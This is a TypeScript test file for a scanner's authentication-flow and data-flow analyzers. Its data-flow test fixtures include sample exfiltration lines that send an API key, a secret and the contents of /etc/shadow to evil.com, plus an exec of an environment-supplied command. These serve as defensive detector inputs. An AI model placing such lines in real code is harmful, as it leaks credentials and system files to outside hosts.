import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { analyzeAuthFlow, isAuthFlowLine } from "../src/analyzers/auth-flow.js";
import { analyzeDataFlow } from "../src/analyzers/data-flow.js";
import type { ScannedFile } from "../src/types.js";

function makeFile(name: string, content: string): ScannedFile {
  return {
    filePath: `/fake/${name}`,
    relativePath: name,
    content,
    lines: content.split("\n"),
    ext: "." + name.split(".").pop(),
    context: "source",
  };
}

// ============================================================
// Auth Flow Analyzer
// ============================================================
describe("auth-flow analyzer", () => {
  it("detects OAuth2 flow patterns", () => {
    const f = makeFile("auth.ts", `
      import { oauth2 } from './lib';
      const token = await getToken(client_credentials);
      const refreshed = await refreshToken(token);
    `);
    const result = analyzeAuthFlow(f);
    assert.ok(result.hasAuthFlow);
    assert.ok(result.patterns.includes("token-management"));
    assert.ok(result.patterns.includes("oauth-flow"));
  });

  it("detects JWT patterns", () => {
    const f = makeFile("jwt-verify.ts", `
      import jwt from 'jsonwebtoken';
      const payload = jwt.verify(token, secret);
    `);
    const result = analyzeAuthFlow(f);
    assert.ok(result.hasAuthFlow);
    assert.ok(result.patterns.includes("jwt"));
  });

  it("detects session management", () => {
    const f = makeFile("session.ts", `
      app.use(passport.initialize());
      app.use(passport.session());
      const session = createSession(user);
    `);
    const result = analyzeAuthFlow(f);
    assert.ok(result.hasAuthFlow);
    assert.ok(result.patterns.includes("session-management"));
  });

  it("detects auth headers", () => {
    const f = makeFile("api.ts", `
      headers["Authorization"] = "Bearer " + token;
    `);
    const result = analyzeAuthFlow(f);
    assert.ok(result.hasAuthFlow);
    assert.ok(result.patterns.includes("auth-header"));
  });

  it("detects auth middleware", () => {
    const f = makeFile("middleware.ts", `
      export const authMiddleware = (req, res, next) => {
        if (!isAuthenticated(req)) return res.status(401).end();
        next();
      };
    `);
    const result = analyzeAuthFlow(f);
    assert.ok(result.hasAuthFlow);
    assert.ok(result.patterns.includes("auth-middleware"));
  });

  it("returns high confidence for multiple auth patterns", () => {
    const f = makeFile("full-auth.ts", `
      import jwt from 'jsonwebtoken';
      const token = await getToken(client_credentials);
      headers["Authorization"] = "Bearer " + token;
      app.use(passport.session());
    `);
    const result = analyzeAuthFlow(f);
    assert.equal(result.confidence, "high");
    assert.ok(result.patterns.length >= 3);
  });

  it("returns no auth flow for regular code", () => {
    const f = makeFile("utils.ts", `
      const x = 1 + 2;
      console.log("hello world");
    `);
    const result = analyzeAuthFlow(f);
    assert.ok(!result.hasAuthFlow);
    assert.equal(result.patterns.length, 0);
  });

  it("isAuthFlowLine detects individual lines", () => {
    assert.ok(isAuthFlowLine('const token = await refreshToken(oldToken);'));
    assert.ok(isAuthFlowLine('headers["Authorization"] = "Bearer " + t;'));
    assert.ok(!isAuthFlowLine('const x = 1 + 2;'));
  });
});

// ============================================================
// Data Flow Analyzer
// ============================================================
describe("data-flow analyzer", () => {
  it("detects env source + HTTP sink connection", () => {
    const f = makeFile("leak.ts", `
      const apiKey = process.env["API_KEY"];
      fetch("https://evil.com/steal?key=" + apiKey);
    `);
    const result = analyzeDataFlow(f);
    assert.ok(result.sources.length > 0);
    assert.ok(result.sinks.length > 0);
    assert.ok(result.connections.length > 0);
    assert.equal(result.risk, "medium");
  });

  it("detects safe API sink", () => {
    const f = makeFile("safe.ts", `
      const token = process.env["TOKEN"];
      fetch("https://api.stripe.com/v1/charges", { headers: { auth: token } });
    `);
    const result = analyzeDataFlow(f);
    assert.ok(result.sinks.length > 0);
    assert.equal(result.sinks[0]!.target, "safe-api");
    assert.ok(result.sinkIsSafe);
  });

  it("detects file read source", () => {
    const f = makeFile("read.ts", `
      const secret = readFileSync("/etc/shadow");
      fetch("https://evil.com/exfil", { body: secret });
    `);
    const result = analyzeDataFlow(f);
    assert.ok(result.sources.some(s => s.type === "file-read"));
    assert.ok(result.connections.length > 0);
    assert.equal(result.risk, "high"); // file-read + http = high
  });

  it("returns no risk for code without sources or sinks", () => {
    const f = makeFile("safe.ts", `
      const x = 1;
      const y = x + 2;
    `);
    const result = analyzeDataFlow(f);
    assert.equal(result.risk, "none");
    assert.equal(result.sources.length, 0);
    assert.equal(result.sinks.length, 0);
  });

  it("detects credential source", () => {
    const f = makeFile("cred.ts", `
      const cred = runtime.credentials.get("api_key");
    `);
    const result = analyzeDataFlow(f);
    assert.ok(result.sources.some(s => s.type === "credential"));
  });

  it("detects exec sink", () => {
    const f = makeFile("exec.ts", `
      const cmd = process.env["CMD"];
      exec(cmd);
    `);
    const result = analyzeDataFlow(f);
    assert.ok(result.sinks.some(s => s.type === "exec"));
    assert.ok(result.connections.length > 0);
  });

  it("handles inline flows (source and sink on same line)", () => {
    const f = makeFile("inline.ts", `
      fetch("https://evil.com?key=" + process.env.SECRET);
    `);
    const result = analyzeDataFlow(f);
    assert.ok(result.sources.length > 0);
    assert.ok(result.sinks.length > 0);
    assert.ok(result.connections.some(c => c.via === "inline"));
  });
});
